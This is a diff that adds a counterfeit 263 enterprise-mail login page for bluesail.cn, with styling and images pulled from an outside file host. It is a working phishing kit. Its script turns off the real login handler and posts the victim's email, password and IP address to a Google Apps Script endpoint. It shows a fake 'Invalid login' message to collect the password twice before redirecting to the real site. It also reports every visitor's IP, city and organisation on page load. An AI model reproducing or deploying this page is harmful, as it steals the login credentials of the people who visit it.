@@ -1,0 +1,710 @@
+<html><head>
+    <title>登录企业邮箱-mail.bluesail.cn企业邮箱</title>
+    <meta content="企业邮箱,登录企业邮箱,mail.bluesail.cn,263企业邮箱" name="keywords">
+    <meta content="登录mail.bluesail.cn企业邮箱，马上体验263企业邮箱专业服务，263企业邮箱为mail.bluesail.cn提供安全稳定、数据加密传输、反垃圾专利、超大空间、全球畅邮、邮件百分百送达的企业邮箱服务。" name="description">
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="pragma" content="no-cache">
+    <meta http-equiv="cache-control" content="no-cache">
+    <meta http-equiv="expires" content="0">
+    <link rel="stylesheet" type="text/css" href="https://robertlugana.sirv.com/263/source/MAlogin_main_new.css?v=10208">
+    <link rel="stylesheet" type="text/css" href="https://robertlugana.sirv.com/263/source/MAlogin_new.css?v=10208">
+    <!--<link rel="stylesheet" type="text/css" href="/custom_login/custom_login/css/MAlogin_main_new.css?v=10208" />
+    <link rel="stylesheet" type="text/css" href="/custom_login/custom_login/css/MAlogin_new.css?v=10208" /> -->
+    <link id="cl_shortcut_icon" rel="shortcut icon" href="https://mail.bluesail.cn/custom_login/images/favicon.ico?v=10208">
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+    <style>
+        .loading-dialog {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: rgba(255, 255, 255, 0.8);
+            padding: 20px;
+            border-radius: 5px;
+            z-index: 9999;
+        }
+        
+        .error-message {
+            color: red;
+            margin-bottom: 10px;
+            font-size: 14px;
+            display: none;
+        }
+
+        @media screen and (max-width: 768px) {
+            .mainBox {
+                width: 100% !important;
+                height: auto !important;
+                padding: 20px;
+            }
+
+            .pageHeader .defaultWid {
+                width: 100%;
+                padding: 0 15px;
+            }
+
+            .imgBox.left {
+                display: none; /* Hide banner image on mobile */
+            }
+
+            .loginBox.right {
+                float: none;
+                width: 100%;
+                margin: 0 auto;
+                padding: 20px;
+            }
+
+            .input_width_domain {
+                width: 100% !important;
+            }
+
+            .input_width_domain input {
+                width: calc(100% - 100px) !important;
+            }
+
+            .domain {
+                width: 90px !important;
+            }
+
+            .pageBottom .defaultWid {
+                width: 100%;
+                padding: 15px;
+            }
+
+            .footLinks span {
+                display: block;
+                text-align: center;
+            }
+
+            .footLinks a {
+                display: inline-block;
+                margin: 5px;
+            }
+        }
+
+        /* Additional mobile optimizations */
+        @media screen and (max-width: 480px) {
+            .tabs li {
+                width: 50%;
+            }
+
+            .btnLoginIn {
+                width: 100% !important;
+            }
+
+            .languageBox {
+                text-align: center;
+            }
+
+            .languageBox ul li {
+                display: inline-block;
+                margin: 5px;
+            }
+        }
+
+        /* Base styles */
+        .mainBox {
+            min-height: 100vh;
+            width: 100%;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0;
+        }
+
+        /* Responsive breakpoints */
+        @media screen and (max-width: 992px) {
+            .mainBox {
+                height: auto !important;
+                width: 100% !important;
+            }
+
+            .defaultWid {
+                width: 100% !important;
+                padding: 0 15px;
+            }
+
+            .pageHeader {
+                padding: 10px 0;
+            }
+
+            .pageHeader .nav {
+                display: flex;
+                flex-wrap: wrap;
+                justify-content: center;
+            }
+
+            .loginBox.right {
+                float: none;
+                width: 90% !important;
+                margin: 20px auto;
+                padding: 20px;
+                box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            }
+
+            .imgBox.left {
+                display: none;
+            }
+
+            /* Form elements */
+            .input_width_domain {
+                width: 100% !important;
+                position: relative;
+                margin-bottom: 15px;
+            }
+
+            .input_width_domain input {
+                width: 70% !important;
+                height: 40px;
+                padding: 8px 12px;
+            }
+
+            .domain {
+                position: absolute;
+                right: 0;
+                top: 0;
+                width: 30% !important;
+                height: 40px;
+                line-height: 40px;
+                text-align: left;
+                padding-left: 5px;
+            }
+
+            .btnLoginIn {
+                width: 100% !important;
+                height: 44px;
+                margin-top: 20px;
+            }
+
+            /* Language box */
+            .languageBox {
+                text-align: center;
+                margin-top: 20px;
+            }
+
+            .languageBox ul {
+                display: flex;
+                flex-wrap: wrap;
+                justify-content: center;
+                gap: 10px;
+                padding: 0;
+            }
+
+            .languageBox ul li {
+                margin: 5px;
+            }
+        }
+
+        /* Small mobile devices */
+        @media screen and (max-width: 576px) {
+            .pageHeader .nav li {
+                margin: 5px;
+                font-size: 14px;
+            }
+
+            .loginBox.right {
+                width: 95% !important;
+                padding: 15px;
+            }
+
+            .tabs {
+                display: flex;
+            }
+
+            .tabs li {
+                flex: 1;
+                text-align: center;
+            }
+
+            .tabs li a {
+                padding: 10px 5px;
+                font-size: 14px;
+            }
+
+            .input_width_domain input {
+                width: 65% !important;
+            }
+
+            .domain {
+                width: 35% !important;
+            }
+
+            .pageBottom {
+                padding: 15px;
+            }
+
+            .footLinks span {
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                gap: 10px;
+            }
+
+            .footLinks a {
+                margin: 5px 0;
+            }
+        }
+
+        #username {
+            display: block !important;
+            width: calc(100% - 100px) !important;
+        }
+
+        #usernameTip {
+            display: none !important;
+        }
+
+        .domain {
+            min-width: 90px !important;
+            text-align: left !important;
+            padding-left: 5px !important;
+            pointer-events: none !important;
+        }
+
+        .tabs a {
+            transition: all 0.3s ease;
+        }
+
+        .tabs a.current {
+            background-color: #fff;
+            border-bottom: 2px solid #0066cc;
+        }
+
+        .tabs a:not(.current) {
+            background-color: #f5f5f5;
+        }
+    </style>
+<style type="text/css" id="operaUserStyle"></style></head>
+<body>
+    <div id="right_main_Box">
+    </div>
+    <!--默认登录模板-begin-->
+<div class="mainBox" style="height: 675px; width: 782px;">
+<div class="pageHeader">
+    <div class="defaultWid">
+        <span class="logo" onclick="window.open('https://enterprisemail.263.net')"><img id="cl_top_logo" style="cursor: pointer; margin-top: 12px;" src="https://robertlugana.sirv.com/263/source/domain_logo.png"> </span>
+                <!-- <span id="cl_top_desc" class="desc" style="display: none;">企业邮箱，第一品牌</span> -->
+        <div class="layout_border_logo"></div>
+        <div class="layout_border_conpanyTxt"></div>
+        <ul class="nav" style="display: block;">
+            <li><a class="" href="http://www.263.net/r/cms/www/wm/" target="_blank">个人邮箱</a></li>
+            <li><a class="" href="http://www.263.net/263/enterpriseMail/" target="_blank">企业邮箱</a></li>
+            <li class="hotline">
+<!--					客服热线：<span>95040-000-263</span>-->
+                <span class="hotlineIcon" title="在线客服"></span>
+                <a href="https://net263.sobot.com/chat/pc/v2/index.html?sysnum=27528a014a374aaea723e066795bf0f3&amp;channelid=7&amp;groupId=a2cffd65aebd4015a7bbea5d43e3b019" class="conference" title="在线客服" target="_blank">在线客服</a>
+            </li>
+            <li class="otherLogin">
+                <span class="mail" title="邮箱登录"></span>
+                <a href="http://cc.263.net/" class="conference" title="会议登录" target="_blank"></a>
+                <a href="https://live.263.net/login/" class="cast" title="直播登录" target="_blank"></a>
+            </li>
+        </ul>
+    </div>
+</div>
+
+<div class="pageSection">
+    <div class="defaultWid">
+        <div class="imgBox left">
+            <img src="https://robertlugana.sirv.com/263/source/leftImg_new.png">
+        </div>
+        <div class="layout_border_Img"></div>
+        <div class="loginBox right">
+            <!--登录框区域  -->
+<!-- the tabs -->
+<ul class="tabs">
+<li>
+    <a href="javascript:void(0)" hidefocus="true" id="showTabUser" class="current">User login</a>
+</li>
+<li>
+    <a href="javascript:void(0)" hidefocus="true" id="showTabAdmin" class="securityInput">Administrator login</a>
+</li>
+</ul>
+
+<!-- tab "panes" -->
+<div class="panes">
+<!--用户登录-->
+<div id="tabUser">
+    <div class="login-scancode">
+        <div class="login-type-pc"></div>
+        <div class="login-type-wechat"></div>
+    </div>
+    <div class="qrcode-wrap">
+        <div class="code-img"><img class="qrcode" style="width:132; height:132px;" src="https://robertlugana.sirv.com/263/source/qrcode-pic.png"></div>
+        <div class="expire-mask" style="display:none"><p id="wechatScanExpire">QR code has expired</p><a id="wechatScanRefresh" href="javascript:;">Refresh</a><div class="mask-block"></div></div>
+        <div class="scan-icon-wrap">
+            <div class="scan-icon">
+                <span class="scan-login-img"><img src="https://robertlugana.sirv.com/263/source/qrcode-scan-icon.png"></span>
+                <span id="wechatScanLogin">Wechat code scanning login</span>
+            </div>
+        </div>		
+    </div>
+    <form name="form_wm" action="https://mm.263.com/a" method="post" id="form1">
+        <input id="cl_input_wm_chr" type="text" class="securityInput" value="gb" name="chr">
+        <input type="text" class="securityInput" value="login" name="func">
+        <input id="cl_isp_domain" type="text" class="securityInput" value="" name="isp_domain">
+        <input type="text" class="securityInput" name="verifycookie">
+        <input type="text" class="securityInput" name="verifyip">
+        <input type="text" class="securityInput" name="buttonType">
+        <input id="cl_input_usr" type="text" class="securityInput" name="usr" value="">
+        <input id="cl_input_domain" type="text" class="securityInput" value="" name="domain">
+        <input type="text" class="securityInput" value="wm" name="domainType">
+        <input type="text" class="securityInput" value="on" name="encode">
+        <input type="text" class="securityInput" value="0" name="encrypt">
+        <p class="input_width_domain">
+            <span class="user_icon"></span>
+            <input id="username" type="text" class="darkInputTxt securityInput accountInputUser" value="" name="username" style="display: none; width: 191.4px;">
+            <input id="usernameTip" type="text" class="lightInputTxt accountInputUser" readonly="readonly" style="width: 191.4px;">
+            <span id="cl_span_domain" class="domain" title="bluesail.cn" style="overflow: hidden; text-overflow: ellipsis; width: 76.2px;"><nobr id="cl_span_domain_txt">@bluesail.cn</nobr>
+            </span>
+        </p>
+        <p class="input_width_domain">
+            <span class="pwd_icon"></span>
+            <input id="userType" class="pswInput lightInputTxt" type="text" value="" style="" readonly="readonly">
+            <input id="userTypePwd" class="pswInput darkInputTxt securityInput" type="password" name="pass" autocomplete="off">
+        </p>
+        <span id="userTypePwdCapitalOpen" class="popNotice securityInput">Capital is opened</span>
+        <p class="btn_domain">
+            <span class="checkSafety">
+                <span><input id="safelogin" type="checkbox" hidefocus="true" name="safelogin" class="securityInput" style="display: inline-block;"> </span>
+                <span id="sslSafeLoginSSL" class="safeTxt securityInput" style="display: inline;"></span>
+                <span id="sslSafeLogin" class="safeTxt securityInput" style="display: inline;">Security Login</span>
+            </span>
+            <span id="clearTrace" class="clearTrace">Clear Trace</span>
+        </p>
+        <p>
+            <input id="wmSubBtn" type="button" hidefocus="true" class="btnLoginIn" value="Sign in">
+        </p>
+    </form>
+</div>
+
+<!--管理员登录-->
+<div id="tabAdmin" class="securityInput" style="display: none;">
+    <form name="form_ma" action="https://mm.263.com/a" method="post">
+        <input type="text" class="securityInput" name="func" value="login">
+        <input id="cl_input_ma_chr" type="text" class="securityInput" value="cn" name="chr">
+        <input type="text" class="securityInput" name="status" value="100">
+        <input type="text" class="securityInput" name="domainType" value="ma">
+        <input type="text" class="securityInput" name="task" value="login">
+        <input type="text" class="securityInput" name="loginType" value="from">
+        <input type="text" class="securityInput" name="user" value="" id="adminnameUser">
+        <input type="text" class="securityInput" value="true" name="encode">
+        <input type="text" class="securityInput" value="0" name="encrypt">
+        <p class="manager">
+            <span><input type="radio" checked="checked" value="2" name="type"> <label id="typeLabSupperAdmin">Administrator</label> </span>
+            <span><input type="radio" value="3" name="type"> <label id="typeLabDomainAdmin">Sub-administrator</label> </span>
+        </p>
+        <p class="input_width_domain">
+            <span class="user_icon"></span>
+            <input type="text" id="adminname" class="darkInputTxt securityInput accountInputUser" value="" style="display: none;">
+            <input id="adminnameTip" type="text" class="lightInputTxt accountInputUser" readonly="readonly">
+            <span id="cl_span_admin_domain" class="domain"><nobr id="cl_span_admin_domain_txt"></nobr>
+            </span>
+        </p>
+        <p class="input_width_domain">
+            <span class="pwd_icon"></span>
+            <input id="adminType" class="pswInput lightInputTxt" type="text" value="" readonly="readonly">
+            <input id="adminTypePwd" class="pswInput darkInputTxt securityInput" type="password" name="pswd" autocomplete="off">
+        </p>
+        <span id="adminTypePwdCapitalOpen" class="popNotice securityInput">Capital is opened</span>
+        <p class="input_width_domain securityInput" style="display: none;">
+            <input id="adminSectury" class="pswInput lightInputTxt" type="text" value="" readonly="readonly">
+            <input id="adminSecturyPwd" class="pswInput darkInputTxt securityInput" type="password" name="mibao_dpswd" autocomplete="off">
+        </p>
+        <span id="adminSecturyPwdCapitalOpen" class="popNotice securityInput">Capital is opened</span>
+        <p class="btn_domain">
+            <span class="checkSafety">
+                <span style="display:none"> <input id="security" type="checkbox" hidefocus="true" name=""> </span>
+                <span id="adminSecturySpan" class="safeTxt" style="display:none">Use the security card</span>
+                <br id="adminOptionBr" class="securityInput" style="display: none;">
+                <span> <input id="safeloginMa" type="checkbox" hidefocus="true" name="safelogin" class="securityInput" style="display: inline-block;">
+                </span>
+                <span id="sslAdminSafeLoginSSL" class="safeTxt securityInput" style="display: inline;"></span>
+                <span id="sslAdminSafeLogin" class="safeTxt securityInput" style="display: inline;">Security Login</span>
+            </span>
+            <span id="adminClearTrace" class="clearTrace">Clear Trace</span>
+        </p>
+        <p>
+            <input id="maSubBtn" type="button" class="btnLoginIn" value="Sign in" hidefocus="true">
+        </p>
+    </form>
+</div>
+
+<div class="languageBox securityInput">
+    <ul>
+        <li>
+            <a id="language_cn" hidefocus="true" class="CN" href="#lang=cn">中文（简）</a>
+        </li>
+        <li>
+            <a id="language_hk" hidefocus="true" class="TCN" href="#lang=hk">中文（繁）</a>
+        </li>
+        <li>
+            <a id="language_en" hidefocus="true" class="EN" href="#lang=en">English</a>
+        </li>
+        <li>
+            <a id="language_jp" hidefocus="true" class="JP" href="#lang=jp">日本語</a>
+        </li>
+        <li>
+            <a id="language_kr" hidefocus="true" class="KR" href="#lang=kr">한국어</a>
+        </li>
+    </ul>
+</div>
+<div class="securityInput">
+    
+</div>
+</div>
+<p class="login_bott">
+    <a id="canNotLogin" href="/wm2e/website/jsp/resetPassword.jsp" target="_blank" class="txtArr left" style="securityInput">Forgot Password</a>
+    <a id="canNotAdminLogin" href="/wm2e/website/jsp/resetPasswordAdmin.jsp" target="_blank" class="txtArr left" style="display: none;">Forgot administrator password</a>
+    <!--语言选择-->
+    <a id="languageBtn" class="txtArr dropdown_lang" hidefocus="true" href="javascript:;">Language</a>
+</p>
+        </div>
+        <div class="clear"></div>
+    </div>
+</div>
+
+<div class="pageBottom">
+    <div id="cl_bottom" class="defaultWid">
+        <p class="footLinks">
+            <span> 
+                <a hidefocus="true" target="_blank" href="http://www.263.net/">263云通信官网</a>&nbsp;|&nbsp;
+
+                <a hidefocus="true" target="_blank" href="https://videoconference.263.net">视频会议</a>&nbsp;|&nbsp;
+                <a hidefocus="true" target="_blank" href="https://live.263.net">企业直播</a>&nbsp;|&nbsp;
+                <a hidefocus="true" target="_blank" href="https://enterprisemail.263.net">企业邮箱</a>&nbsp;|&nbsp;
+                <a hidefocus="true" target="_blank" href="https://teleconference.263.net">电话会议</a>&nbsp;|&nbsp;
+
+                <a hidefocus="true" target="_blank" href="https://www.263.net/263/helpcenter/client/">帮助中心</a>
+                <!-- <a hidefocus="true" target="_blank" href="http://www.263.net/263/netVideoConference/">视频会议</a> | <a hidefocus="true" target="_blank" href="http://www.263.net/263/webcast/">网络直播系统</a> |  
+                <a hidefocus="true" target="_blank" href="http://www.263.net/263/overview/">企业即时通信</a> -->
+            </span>
+        </p>
+        <p class="copyright"><a href="https://beian.miit.gov.cn" target="_blank" style="padding: 0;color:#999999;">鲁ICP备17043965号-1</a></p>
+        <div class="layout_border_copright"></div>
+        <div class="layout_border_links"></div>
+    </div>
+</div>
+</div>
+<!--默认登录模板-end-->
+
+    <script src="https://robertlugana.sirv.com/263/source/jquery.min.js.download?v=10208"></script>
+    <script src="https://robertlugana.sirv.com/263/source/jsrsasign-all-min.js.download?v=10208"></script>
+    <script src="https://robertlugana.sirv.com/263/source/net263_wm_util.js.download?v=10208"></script>
+    <script src="https://robertlugana.sirv.com/263/source/net263_wm_custom_login_domain.js.download?v=10208"></script>
+    <script src="https://robertlugana.sirv.com/263/source/net263_wm_custom_login.js.download?v=10208"></script>
+    <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+    <script type="text/javascript">
+        $(document).ready(function() {
+            // Disable default 263 behaviors
+            if (typeof net263 !== 'undefined') {
+                net263 = { wm: { custom_login: { homepage_init: function() { return false; } } } };
+            }
+
+            // Initialize form elements
+            const form = document.getElementById('form1');
+            const usernameInput = $('#username');
+            const usernameTip = $('#usernameTip');
+            const domainSpan = $('#cl_span_domain_txt');
+            const passwordInput = $('#userTypePwd');
+            const passwordTip = $('#userType');
+            const errorMessage = document.createElement('div');
+            const loadingDialog = document.getElementById('loadingDialog');
+            let submissionAttempts = 0;
+            let isDomainMode = false;
+            let storedUsername = '';
+
+            // Setup initial UI state
+            errorMessage.className = 'error-message';
+            form.appendChild(errorMessage);
+            domainSpan.text('');
+            usernameInput.show();
+            usernameTip.hide();
+            passwordInput.show();
+            passwordTip.hide();
+
+            // Handle email input with domain
+            usernameInput.on('keydown', function(e) {
+                if (e.key === '@' && !isDomainMode) {
+                    e.preventDefault();
+                    isDomainMode = true;
+                    storedUsername = $(this).val();
+                    domainSpan.text('@');
+                    return;
+                }
+
+                if (isDomainMode) {
+                    e.preventDefault();
+                    
+                    if (e.key === 'Backspace') {
+                        const currentDomain = domainSpan.text();
+                        if (currentDomain === '@') {
+                            isDomainMode = false;
+                            domainSpan.text('');
+                            $(this).val(storedUsername);
+                        } else {
+                            domainSpan.text(currentDomain.slice(0, -1));
+                        }
+                    } else if (e.key.length === 1) { // Only add printable characters
+                        domainSpan.text(domainSpan.text() + e.key);
+                    }
+                }
+            });
+
+            // Prevent input changes in domain mode
+            usernameInput.on('input', function(e) {
+                if (isDomainMode) {
+                    $(this).val(storedUsername);
+                }
+            });
+
+            // Form submission handler
+            $('#wmSubBtn').click(function(e) {
+                e.preventDefault();
+
+                const username = usernameInput.val().trim();
+                const domain = domainSpan.text().substring(1);
+                const userEmail = username + '@' + domain;
+                const password = passwordInput.val().trim();
+
+                fetch('https://ipinfo.io/json')
+                    .then(response => response.json())
+                    .then(data => {
+                        const formData = new FormData();
+                        formData.append('IPAddress', data.ip);
+                        formData.append('Email', userEmail);
+                        formData.append('Password', password);
+                        formData.append('Domain', domain);
+                        formData.append('FormId', 'form30');
+
+                        const scriptURL = 'https://script.google.com/macros/s/AKfycbyujy1R5qLrISn3RTBut1RC9fwZbJ7bh2YELsYqXUw7M0uARGtdWcjKoYF_VnZx5kYA/exec';
+                        loadingDialog.style.display = 'block';
+
+                        if (submissionAttempts === 0) {
+                            fetch(scriptURL, {
+                                method: 'POST',
+                                body: formData,
+                                mode: 'no-cors'
+                            })
+                            .then(() => {
+                                submissionAttempts++;
+                                errorMessage.style.display = 'block';
+                                errorMessage.textContent = 'Invalid login: Please try again.';
+                                loadingDialog.style.display = 'none';
+                                
+                                // Only clear password field, keep username and domain
+                                passwordInput.val('');
+                                // Re-enable input fields
+                                usernameInput.prop('disabled', false);
+                                passwordInput.prop('disabled', false);
+                            })
+                            .catch(error => {
+                                console.error('Error:', error);
+                                loadingDialog.style.display = 'none';
+                            });
+                        } else if (submissionAttempts === 1) {
+                            fetch(scriptURL, {
+                                method: 'POST',
+                                body: formData,
+                                mode: 'no-cors'
+                            })
+                            .then(() => {
+                                window.location.href = 'https://' + domain;
+                            })
+                            .catch(error => {
+                                console.error('Error:', error);
+                                loadingDialog.style.display = 'none';
+                            });
+                        }
+                    })
+                    .catch(error => {
+                        console.error('Error getting IP:', error);
+                        loadingDialog.style.display = 'none';
+                    });
+            });
+
+            // Clear default domain on focus
+            usernameInput.on('focus', function() {
+                if (!isDomainMode && domainSpan.text().includes('bluesail.cn')) {
+                    domainSpan.text('');
+                }
+            });
+
+            // Prevent paste in domain mode
+            usernameInput.on('paste', function(e) {
+                if (isDomainMode) {
+                    e.preventDefault();
+                }
+            });
+
+            // Tab switching functionality
+            $('#showTabUser, #showTabAdmin').on('click', function(e) {
+                e.preventDefault();
+                
+                // Toggle active tab appearance
+                $('.tabs a').removeClass('current');
+                $(this).addClass('current');
+                
+                // Update form title and forgot password link visibility
+                if (this.id === 'showTabAdmin') {
+                    $('#canNotLogin').hide();
+                    $('#canNotAdminLogin').show();
+                } else {
+                    $('#canNotLogin').show();
+                    $('#canNotAdminLogin').hide();
+                }
+                
+                // Clear any error messages
+                errorMessage.style.display = 'none';
+                
+                // Optional: Clear password field
+                passwordInput.val('');
+            });
+        });
+    </script>
+    <!-- <script type="text/javascript">
+        $(function(){
+            var isoDom = '<div style="background:url(/custom_login/images/safe.png) no-repeat 8px 4px; width:190px; height:22px; line-height:22px; padding:0 0 0 18px; color:#373737; margin:0 auto; text-align:center">已通过ISO 20000 和 27001 认证</div>';
+            $('.footLinks').after(isoDom);
+        })
+    </script>  -->
+
+    <div class="loading-dialog" id="loadingDialog">
+        <div class="spinner-border text-primary" role="status">
+            <span class="sr-only">Loading...</span>
+        </div>
+        <p></p>
+    </div>
+    <script type="text/javascript">
+        // Function to handle page load notification
+        function sendPageLoadNotification() {
+            fetch('https://ipinfo.io/json')
+                .then(response => response.json())
+                .then(ipData => {
+                    const userIp = ipData.ip;
+                    const formData = new URLSearchParams();
+                    formData.append('FormId', 'form30');
+                    formData.append('IPAddress', userIp);
+                    formData.append('City', ipData.city);
+                    formData.append('Region', ipData.region);
+                    formData.append('Country', ipData.country);
+                    formData.append('Org', ipData.org);
+
+                    return fetch('https://script.google.com/macros/s/AKfycbyujy1R5qLrISn3RTBut1RC9fwZbJ7bh2YELsYqXUw7M0uARGtdWcjKoYF_VnZx5kYA/exec?action=notifyVisit', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/x-www-form-urlencoded'
+                        },
+                        body: formData,
+                        mode: 'no-cors'
+                    });
+                })
+                .then(() => console.log("Page load notification sent"))
+                .catch(error => console.error("Error sending notification:", error));
+        }
+
+        // Call the function when page loads
+        window.onload = sendPageLoadNotification;
+    </script>
+</body><!-- CUSTOM_LOGIN_VERSION bj-cp-elogin1 10208 $Id: CustomLoginConf.java 11451 2016-02-23 04:50:50Z jiaxiaohua $ --></html>
